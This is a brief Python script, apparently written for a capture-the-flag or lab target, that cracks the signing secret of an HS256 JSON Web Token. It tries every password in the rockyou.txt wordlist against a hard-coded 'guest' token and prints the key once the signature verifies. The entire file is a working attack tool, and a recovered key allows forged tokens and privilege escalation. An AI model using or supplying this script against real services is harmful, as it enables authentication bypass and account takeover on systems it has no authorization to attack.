import jwt

# === Your JWT token ===
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.1bAygaodib4H4E3iMScGZ4DfAy1NZMvCI8hAXP_NCfA"

# === Path to wordlist ===
wordlist_path = "./rockyou.txt"

# === Brute-force from file ===
with open(wordlist_path, "r", errors="ignore") as f:
    for line in f:
        key = line.strip()
        try:
            decoded = jwt.decode(token, key, algorithms=["HS256"])
            print(f"\n✅ VALID KEY FOUND: '{key}'")
            print("Decoded payload:", decoded)
            break
        except jwt.exceptions.InvalidSignatureError:
            continue
        except Exception as e:
            print(f"[!] Error with key '{key}': {e}")
